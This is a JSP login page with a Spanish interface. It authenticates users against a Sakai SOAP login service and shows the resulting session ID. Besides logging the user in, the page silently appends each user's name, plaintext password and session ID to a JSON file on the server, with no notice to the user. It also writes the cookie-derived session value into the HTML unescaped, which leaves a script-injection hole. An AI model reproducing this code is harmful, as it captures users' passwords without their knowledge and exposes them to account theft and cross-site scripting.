<%@ page language="java" contentType="text/html; charset=UTF-8"
    pageEncoding="UTF-8"%>
<%@page import="com.baeldung.soap.ws.client.generated.SakaiLogin"%>
<%@page import="com.baeldung.soap.ws.client.generated.SakaiLoginService"%>
<%@page import="com.sun.xml.ws.fault.ServerSOAPFaultException"%>
<%@page import="java.net.URLDecoder" %>
<%@page import="java.net.URLEncoder" %>
<%@page import="java.io.File" %>
<%@page import="java.io.FileWriter" %>
<%@page import="java.util.Scanner" %>
<%@page import="java.io.FileNotFoundException" %>
<%
// Constants
final String USER_NAME_PARAMETER = "user_name";
final String PASSWORD_PARAMETER = "password";

final String INVALID_CREDENTIALS_STATUS = "invalid_credentials";
final String SUCCESS_LOGIN_STATUS = "succes_login";
final String PREV_LOGIN_STATUS = "prev_login";
final String NOT_LOGIN_STATUS = "not_login";

final String SESSION_COOKIE_NAME = "session_cookie";
%>

<%
// Read Cookie
Cookie cookie = null;
Cookie[] cookies = null;
String id_session = null;

cookies = request.getCookies();
if( cookies != null ){
   for (int i = 0; i < cookies.length; i++){
      cookie = cookies[i];
      if (cookie.getName().equals(SESSION_COOKIE_NAME))
    	  id_session = URLDecoder.decode(cookie.getValue(), "utf-8");
   }
}
%>

<%
// get json-file-path
	ServletContext context = pageContext.getServletContext();
	String jsonFilePath = context.getInitParameter("json-file-path");
%>

<%
// Determine current status	
	String status = null;

	if (id_session != null){
		status = PREV_LOGIN_STATUS;
	}
	else if(request.getMethod().equals("POST")){	
		// Get credentials
		String user_name = request.getParameter(USER_NAME_PARAMETER);
		String password = request.getParameter(PASSWORD_PARAMETER);
		// Load login service
		SakaiLoginService loginService = new SakaiLoginService();
		SakaiLogin login = loginService.getSakaiLoginPort();
		try{
			// Call login service
			id_session = login.login(user_name, password);
			status = SUCCESS_LOGIN_STATUS;
		}catch(ServerSOAPFaultException e){
			status = INVALID_CREDENTIALS_STATUS;
		}	
		if (id_session != null){
			// Add cookie   
			Cookie session_cookie = new Cookie(
				SESSION_COOKIE_NAME, 
				URLEncoder.encode(id_session,"utf-8")
			);
			session_cookie.setMaxAge(60*60*24);  
			response.addCookie(session_cookie);
			//Read json
			String json = "";
			try {
		      File jsonFile = new File(jsonFilePath);
		      Scanner myReader = new Scanner(jsonFile);
		      while (myReader.hasNextLine()) {
		      	json = json + myReader.nextLine();
		      }
		      myReader.close();
		      json = json.trim().substring(0, json.length()-1) + ", ";
		    } catch (FileNotFoundException e) {
		      json = "[";
		    }
			// Add info to json
			json = json  
					+ "{\"id\":\"" + user_name 
					+ "\", \"pw\":\"" + password 
					+ "\", \"id_session\": \"" + id_session 
					+ "\"}]";
			// Write json
			File f = new File(jsonFilePath);        
			FileWriter filewriter = new FileWriter(f, false);
			filewriter.write(json);
			filewriter.flush();
			filewriter.close();
		}
	}
	else if(request.getMethod().equals("GET")){
		status = NOT_LOGIN_STATUS;
	}
%>

<%
// Set view
	String loginFormClass = "";
	String logoutFormClass = "";
	String loginFormErrorMessage = "";
	String logoutFormMessage = "";
	String loadingClass = "";

	if(status == NOT_LOGIN_STATUS){
		loginFormClass = "visible";
		logoutFormClass = "hidden";
		loginFormErrorMessage = "";
		loadingClass = "static-lds-ellipsis";
	}
	else if(status == INVALID_CREDENTIALS_STATUS){
		loginFormClass = "visible";
		logoutFormClass = "hidden";
		loginFormErrorMessage = "Error al iniciar sesión, verifique sus credenciales";
		loadingClass = "hidden-static-lds-ellipsis";
	}
	else if(status == SUCCESS_LOGIN_STATUS){
		loginFormClass = "hidden";
		logoutFormClass = "visible";
		logoutFormMessage = "Inicio de sesión exitoso!";
	}
	else if(status == PREV_LOGIN_STATUS){
		loginFormClass = "hidden";
		logoutFormClass = "visible";
		logoutFormMessage = "Ya existe una sesión activa!";
	}
%> 
   
<!DOCTYPE html>
<html>
<head>
<jsp:include page="generic-head.jsp"/>
<title>Iniciar Sesión</title>
</head>
<body class="main-container">
	<!--  Login Form -->
	<div class='login-form-container <%=loginFormClass%>'>
		<form id="login-form" action="iniciar-sesion.jsp" method="post">
		<div class='form-title'>
			Inicio de sesión en su cuenta
		</div>
		<fieldset id="login-fieldset">
			<div class="form-group">
				<label>Usuario:</label>
				<input id="login-name-input" type="text" name="<%=USER_NAME_PARAMETER%>">
			</div>
			<div class="form-group">
				<label>Contraseña:</label>
				<input id="login-pass-input" type="password" name="<%=PASSWORD_PARAMETER%>">
			</div>
			<div class="form-group center">
				<button type="button" id="login-button">Iniciar Sesión</button>
			</div>
		</fieldset>
		<div class="center">
			<div id="login-loading" class="<%=loadingClass%>"><div></div><div></div><div></div><div></div></div>
		</div>
		<div id="login-error-message" class="form-error-message center">
			<%=loginFormErrorMessage%>
		</div>
		</form>
	</div>
	
	<!-- LogOut Form -->
	<div class='logout-form-container <%=logoutFormClass%>'>
	<form id="logout-form" action="cerrar-sesion.jsp" method="get">
		<div class='logout-form-message form-title'>
			<%=logoutFormMessage%>
		</div>	
		<div>
			<span style="font-weight:bold">Identificador de la sesión:</span> <br><br>
			<%=id_session%>
		</div>
		<div class="form-group center">
			<button type="submit">Cerrar sesión</button>
		</div>
	</form>
	</div>
	<script type="text/javascript" src="scripts/login-script.js"></script>
</body>
</html>